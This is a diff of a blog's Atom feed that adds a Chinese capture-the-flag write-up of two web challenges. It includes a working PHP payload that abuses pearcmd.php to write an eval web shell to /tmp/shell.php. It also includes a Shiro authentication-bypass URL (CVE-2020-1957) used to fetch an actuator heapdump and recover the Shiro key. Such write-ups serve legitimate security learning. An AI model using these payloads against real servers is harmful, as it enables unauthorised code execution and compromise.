@@ -6,7 +6,7 @@
   <link href="https://h3h3qaq.github.io/atom.xml" rel="self"/>
   
   <link href="https://h3h3qaq.github.io/"/>
-  <updated>2021-11-14T07:58:22.767Z</updated>
+  <updated>2021-11-14T13:30:15.037Z</updated>
   <id>https://h3h3qaq.github.io/</id>
   
   <author>
@@ -15,6 +15,30 @@
   </author>
   
   <generator uri="https://hexo.io/">Hexo</generator>
+  
+  <entry>
+    <title>2021湖湘杯web部分wp</title>
+    <link href="https://h3h3qaq.github.io/posts/a17e1508.html"/>
+    <id>https://h3h3qaq.github.io/posts/a17e1508.html</id>
+    <published>2021-11-14T13:30:22.000Z</published>
+    <updated>2021-11-14T13:30:15.037Z</updated>
+    
+    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h1 id="easywill"><a href="#easywill" class="headerlink" title="easywill"></a>easywill</h1><p>本人sb，写好的wp被窝删掉了QAQ</p><p>很简单的一道题包含pearcmd.php（审计一下源码就能看到）</p><p>好像竞争上传也可以（没试）</p><p>payload还记得</p><pre class="line-numbers language-none"><code class="language-none">/index.php?+config-create+/&amp;&amp;name=cfile&amp;value=/usr/local/lib/php/pearcmd.php&amp;/&lt;?=eval($_POST[1]);?&gt;+/tmp/shell.php <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>写入然后包含一下就行</p><h1 id="Pentest-in-Autumn"><a href="#Pentest-in-Autumn" class="headerlink" title="Pentest in Autumn"></a>Pentest in Autumn</h1><p>给了附件，打开之后发现是shiro框架</p><p><img src="https://i.loli.net/2021/11/14/tqlU8rCFzP4pfdm.png"></p><p>第一反应就是看看有没有actuator未授权访问漏洞</p><p>这样拿到key就可以工具一把梭哈</p><p>访问/actuator路由，有如下内容</p><p><img src="https://i.loli.net/2021/11/14/SifO7gpzloMt9Ay.png"></p><p>继续访问heapdump，发现跳到了404</p><p>到这里卡了很久，后来想到能不能绕过一下</p><p>又看到Shiro &lt; 1.5.2 想到shiro权限绕过 CVE-2020-1957</p><blockquote><p><a href="https://blog.csdn.net/weixin_50464560/article/details/120752809">https://blog.csdn.net/weixin_50464560/article/details/120752809</a></p></blockquote><p>随即构造url</p><pre class="line-numbers language-none"><code class="language-none">/;/actuator/heapdump<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>成功下载到heapdump文件</p><p>接下来就是寻找key的过程</p><blockquote><p><a href="https://www.cnblogs.com/icez/p/Actuator_heapdump_exploit.html">https://www.cnblogs.com/icez/p/Actuator_heapdump_exploit.html</a></p></blockquote><p>参考此文章利用visualvm工具成功拿到了key</p><p><img src="https://i.loli.net/2021/11/14/tEOx2C4M3a6SBzW.png"></p><p>然后利用shiro attack 工具，一把梭</p><p><img src="https://i.loli.net/2021/11/14/hWaU2dNAVPmnli7.png"></p>]]></content>
+    
+    
+      
+      
+    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
+      
+    
+    
+    
+    <category term="wp" scheme="https://h3h3qaq.github.io/categories/wp/"/>
+    
+    
+    <category term="大赛wp" scheme="https://h3h3qaq.github.io/tags/%E5%A4%A7%E8%B5%9Bwp/"/>
+    
+  </entry>
   
   <entry>
     <title>CVE-2019-8362 Dedecms v5.7 sp2 后台文件上传 getshell</title>
